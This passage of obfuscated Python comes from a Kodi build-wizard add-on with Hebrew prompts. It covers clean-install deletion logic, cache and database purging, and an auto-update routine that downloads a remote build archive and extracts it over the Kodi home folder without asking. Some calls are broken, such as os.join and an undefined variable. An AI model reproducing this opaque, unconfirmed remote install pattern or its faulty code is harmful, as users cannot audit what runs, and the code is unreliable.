				elif OOO000O0OO00O0O00 =='b-srtym-b.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4798
				elif OOO000O0OO00O0O00 =='x1102.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4799
				elif OOO000O0OO00O0O00 =='b-sdrvt-b.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4800
				elif OOO000O0OO00O0O00 =='x1112.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4801
				elif OOO000O0OO00O0O00 =='b-tlvvyzyh-b.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4802
				elif OOO000O0OO00O0O00 =='x1111.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4803
				elif OOO000O0OO00O0O00 =='b-tvknyshrly-b.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4804
				elif OOO000O0OO00O0O00 =='x1110.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4805
				elif OOO000O0OO00O0O00 =='b-yldym-b.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4806
				elif OOO000O0OO00O0O00 =='x1114.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4807
				elif OOO000O0OO00O0O00 =='b-mvzyqh-b.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4808
				elif OOO000O0OO00O0O00 =='mainmenu.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4809
				elif OOO000O0OO00O0O00 =='skin.Premium.mod.properties'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4810
				elif OOO000O0OO00O0O00 =='x1122.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4812
				elif OOO000O0OO00O0O00 =='b-spvrt-b.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4813
				elif OOO000O0OO00O0O00 =='favourites.xml'and OOOOOOOOOO00O00OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4818
				elif OOO000O0OO00O0O00 =='guisettings.xml'and OOOOOOOOOO00O00OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4820
				elif OOO000O0OO00O0O00 =='profiles.xml'and OOOOOOOOOO00O00OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4821
				elif OOO000O0OO00O0O00 =='advancedsettings.xml'and OOOOOOOOOO00O00OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4822
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4823
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'program.apollo'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4824
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4825
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'plugin.video.elementum'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4828
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4829
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4830
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'weather.yahoo'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4831
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'plugin.video.quasar'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4832
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'program.apollo'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4833
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4834
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4835
				elif OOO000O0OO00O0O00 in LOGFILES :wiz .log ("Keep Log File: %s"%OOO000O0OO00O0O00 ,xbmc .LOGNOTICE )#line:4836
				elif OOO000O0OO00O0O00 .endswith ('.db'):#line:4837
					try :#line:4838
						if OOO000O0OO00O0O00 ==O0O00O000000OO0O0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOO000O0OO00O0O00 ,KODIV ),xbmc .LOGNOTICE )#line:4839
						else :os .remove (os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ))#line:4840
					except Exception as OOO0O00O0O0OOOOOO :#line:4841
						if not OOO000O0OO00O0O00 .startswith ('Textures13'):#line:4842
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4843
							wiz .log ("-> %s"%(str (OOO0O00O0O0OOOOOO )),xbmc .LOGNOTICE )#line:4844
							wiz .purgeDb (os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ))#line:4845
				else :#line:4846
					DP .update (int (wiz .percentage (O0000000O000O0000 ,OO0OOOOO0OO0000O0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000O0OO00O0O00 ),'')#line:4847
					try :os .remove (os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ))#line:4848
					except Exception as OOO0O00O0O0OOOOOO :#line:4849
						wiz .log ("Error removing %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4850
						wiz .log ("-> / %s"%(str (OOO0O00O0O0OOOOOO )),xbmc .LOGNOTICE )#line:4851
			if DP .iscanceled ():#line:4852
				DP .close ()#line:4853
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4854
				return False #line:4855
		for OO0OO00OO0O0OOO0O ,OO0O0OOO0OOOO0O00 ,O0OOOOOO000O0O000 in os .walk (O0OO000O0O0O00OOO ,topdown =True ):#line:4856
			OO0O0OOO0OOOO0O00 [:]=[OOO0O0O0O0OO0O0OO for OOO0O0O0O0OO0O0OO in OO0O0OOO0OOOO0O00 if OOO0O0O0O0OO0O0OO not in EXCLUDES ]#line:4857
			for OOO000O0OO00O0O00 in OO0O0OOO0OOOO0O00 :#line:4858
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO000O0OO00O0O00 ),'')#line:4859
			  if OOO000O0OO00O0O00 not in ["Database","userdata","temp","addons","addon_data"]:#line:4860
			   if not (OOO000O0OO00O0O00 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4861
			    if not (OOO000O0OO00O0O00 =='skin.titan'and KEEPSKIN3 =='true'):#line:4863
			      if not (OOO000O0OO00O0O00 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4864
			       if not (OOO000O0OO00O0O00 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4865
			        if not (OOO000O0OO00O0O00 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4866
			         if not (OOO000O0OO00O0O00 =='program.apollo'and KEEPINFO =='true'):#line:4867
			          if not (OOO000O0OO00O0O00 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4868
			           if not (OOO000O0OO00O0O00 =='weather.yahoo'and KEEPWEATHER =='true'):#line:4869
			            if not (OOO000O0OO00O0O00 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4870
			             if not (OOO000O0OO00O0O00 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4871
			              if not (OOO000O0OO00O0O00 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4872
			               if not (OOO000O0OO00O0O00 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4873
			                if not (OOO000O0OO00O0O00 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4874
			                 if not (OOO000O0OO00O0O00 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4875
			                  if not (OOO000O0OO00O0O00 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4876
			                   if not (OOO000O0OO00O0O00 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4877
			                    if not (OOO000O0OO00O0O00 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4878
			                     if not (OOO000O0OO00O0O00 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4879
			                       if not (OOO000O0OO00O0O00 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4881
			                           if not (OOO000O0OO00O0O00 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4885
			                            if not (OOO000O0OO00O0O00 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4886
			                             if not (OOO000O0OO00O0O00 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4887
			                              if not (OOO000O0OO00O0O00 =='plugin.video.quasar'and KEEPINFO =='true'):#line:4888
			                               if not (OOO000O0OO00O0O00 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4889
			                                  shutil .rmtree (os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),ignore_errors =True ,onerror =None )#line:4891
			if DP .iscanceled ():#line:4892
				DP .close ()#line:4893
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4894
				return False #line:4895
		DP .close ()#line:4896
		wiz .clearS ('build')#line:4897
		if over ==True :#line:4898
			return True #line:4899
		elif install =='restore':#line:4900
			return True #line:4901
		elif install :#line:4902
			buildWizard (install ,'normal',over =True )#line:4903
		else :#line:4904
			if INSTALLMETHOD ==1 :O000OOO00OOO00O0O =1 #line:4905
			elif INSTALLMETHOD ==2 :O000OOO00OOO00O0O =0 #line:4906
			else :O000OOO00OOO00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4907
			if O000OOO00OOO00O0O ==1 :wiz .reloadFix ('fresh')#line:4908
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4909
	else :#line:4910
		if not install =='restore':#line:4911
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4912
			wiz .refresh ()#line:4913
def clearCache ():#line:4918
		wiz .clearCache ()#line:4919
def fixwizard ():#line:4923
		wiz .fixwizard ()#line:4924
def totalClean ():#line:4926
		wiz .clearCache ()#line:4928
		wiz .clearPackages ('total')#line:4929
		clearThumb ('total')#line:4930
		cleanfornewbuild ()#line:4931
def cleanfornewbuild ():#line:4932
		try :#line:4933
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4934
		except :#line:4935
			pass #line:4936
		try :#line:4937
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4938
		except :#line:4939
			pass #line:4940
		try :#line:4941
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4942
		except :#line:4943
			pass #line:4944
def clearThumb (type =None ):#line:4945
	O000OO0OOOO000OO0 =wiz .latestDB ('Textures')#line:4946
	if not type ==None :O00OO0O0OOOOOOOO0 =1 #line:4947
	else :O00OO0O0OOOOOOOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O000OO0OOOO000OO0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4948
	if O00OO0O0OOOOOOOO0 ==1 :#line:4949
		try :wiz .removeFile (os .join (DATABASE ,O000OO0OOOO000OO0 ))#line:4950
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O000OO0OOOO000OO0 )#line:4951
		wiz .removeFolder (THUMBS )#line:4952
	else :wiz .log ('Clear thumbnames cancelled')#line:4954
	wiz .redoThumbs ()#line:4955
def purgeDb ():#line:4957
	O0OOOOO0000000O0O =[];O0OOO000OO00O00O0 =[]#line:4958
	for O0O00OOOO0O00OO0O ,OO0000O0O0O000OO0 ,O0OOOO000000000O0 in os .walk (HOME ):#line:4959
		for O00OO0OO000O00O00 in fnmatch .filter (O0OOOO000000000O0 ,'*.db'):#line:4960
			if O00OO0OO000O00O00 !='Thumbs.db':#line:4961
				OO0OO00OOOOO0O000 =os .path .join (O0O00OOOO0O00OO0O ,O00OO0OO000O00O00 )#line:4962
				O0OOOOO0000000O0O .append (OO0OO00OOOOO0O000 )#line:4963
				O000O00OO0000O000 =OO0OO00OOOOO0O000 .replace ('\\','/').split ('/')#line:4964
				O0OOO000OO00O00O0 .append ('(%s) %s'%(O000O00OO0000O000 [len (O000O00OO0000O000 )-2 ],O000O00OO0000O000 [len (O000O00OO0000O000 )-1 ]))#line:4965
	if KODIV >=16 :#line:4966
		OO0OO0OOOOOO0OO00 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OOO000OO00O00O0 )#line:4967
		if OO0OO0OOOOOO0OO00 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4968
		elif len (OO0OO0OOOOOO0OO00 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4969
		else :#line:4970
			for O0O00O0000OOO0000 in OO0OO0OOOOOO0OO00 :wiz .purgeDb (O0OOOOO0000000O0O [O0O00O0000OOO0000 ])#line:4971
	else :#line:4972
		OO0OO0OOOOOO0OO00 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OOO000OO00O00O0 )#line:4973
		if OO0OO0OOOOOO0OO00 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4974
		else :wiz .purgeDb (O0OOOOO0000000O0O [O0O00O0000OOO0000 ])#line:4975
def fastupdatefirstbuild (O0OO0O0OOO0OOO0OO ):#line:4981
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:4983
	if ENABLE =='Yes':#line:4984
		if not NOTIFY =='true':#line:4985
			OOOOO0O0O00OO00O0 =wiz .workingURL (NOTIFICATION )#line:4986
			if OOOOO0O0O00OO00O0 ==True :#line:4987
				OO00OO000OO0O0OO0 ,O0000O000000O0O0O =wiz .splitNotify (NOTIFICATION )#line:4988
				if not OO00OO000OO0O0OO0 ==False :#line:4990
					try :#line:4991
						OO00OO000OO0O0OO0 =int (OO00OO000OO0O0OO0 );O0OO0O0OOO0OOO0OO =int (O0OO0O0OOO0OOO0OO )#line:4992
						checkidupdate ()#line:4993
						wiz .setS ("notedismiss","true")#line:4994
						if OO00OO000OO0O0OO0 ==O0OO0O0OOO0OOO0OO :#line:4995
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO00OO000OO0O0OO0 ),xbmc .LOGNOTICE )#line:4996
						elif OO00OO000OO0O0OO0 >O0OO0O0OOO0OOO0OO :#line:4998
							wiz .log ("[Notifications] id: %s"%str (OO00OO000OO0O0OO0 ),xbmc .LOGNOTICE )#line:4999
							wiz .setS ('noteid',str (OO00OO000OO0O0OO0 ))#line:5000
							wiz .setS ("notedismiss","true")#line:5001
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5004
					except Exception as OOOOOO00OO000O0O0 :#line:5005
						wiz .log ("Error on Notifications Window: %s"%str (OOOOOO00OO000O0O0 ),xbmc .LOGERROR )#line:5006
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5008
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOOOO0O0O00OO00O0 ),xbmc .LOGNOTICE )#line:5009
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5010
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5011
def checkidupdate ():#line:5017
				wiz .setS ("notedismiss","true")#line:5019
				O00O0OOO0OOO0OO0O =wiz .workingURL (NOTIFICATION )#line:5020
				O0O00O00OO00OOOO0 =" Kodi Premium"#line:5022
				OOOO000OOOOOOOO00 =wiz .checkBuild (O0O00O00OO00OOOO0 ,'gui')#line:5023
				OOOOO000O00O0O000 =O0O00O00OO00OOOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5024
				if not wiz .workingURL (OOOO000OOOOOOOO00 )==True :return #line:5025
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5026
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O00O00OO00OOOO0 ),'','אנא המתן')#line:5027
				OO0O0O000OOOO000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOO000O00O0O000 )#line:5028
				try :os .remove (OO0O0O000OOOO000O )#line:5029
				except :pass #line:5030
				logging .warning (OOOO000OOOOOOOO00 )#line:5031
				if 'google'in OOOO000OOOOOOOO00 :#line:5032
				   O00OOOOO0O00O000O =googledrive_download (OOOO000OOOOOOOO00 ,OO0O0O000OOOO000O ,DP ,wiz .checkBuild (O0O00O00OO00OOOO0 ,'filesize'))#line:5033
				else :#line:5036
				  downloader .download (OOOO000OOOOOOOO00 ,OO0O0O000OOOO000O ,DP )#line:5037
				xbmc .sleep (100 )#line:5038
				O0OOOOOOO0OO0O0OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00O00OO00OOOO0 )#line:5039
				DP .update (0 ,O0OOOOOOO0OO0O0OO ,'','אנא המתן')#line:5040
				extract .all (OO0O0O000OOOO000O ,HOME ,DP ,title =O0OOOOOOO0OO0O0OO )#line:5041
				DP .close ()#line:5042
				wiz .defaultSkin ()#line:5043
				wiz .lookandFeelData ('save')#line:5044
				if KODIV >=18 :#line:5045
					skindialogsettind18 ()#line:5046
				wiz .kodi17Fix ()#line:5047
				if INSTALLMETHOD ==1 :OO0O00O0000O00000 =1 #line:5049
				elif INSTALLMETHOD ==2 :OO0O00O0000O00000 =0 #line:5050
				else :DP .close ()#line:5051
def gaiaserenaddon ():#line:5053
  O00OOO00OO0O0OOO0 =(ADDON .getSetting ("gaiaseren"))#line:5054
  OOOO0O0OOOOO0O0O0 =(ADDON .getSetting ("rdbuild"))#line:5055
  if O00OOO00OO0O0OOO0 =='true'and OOOO0O0OOOOO0O0O0 =='true':#line:5056
    O00OOOO0OOOOOOOOO =(NEWFASTUPDATE )#line:5057
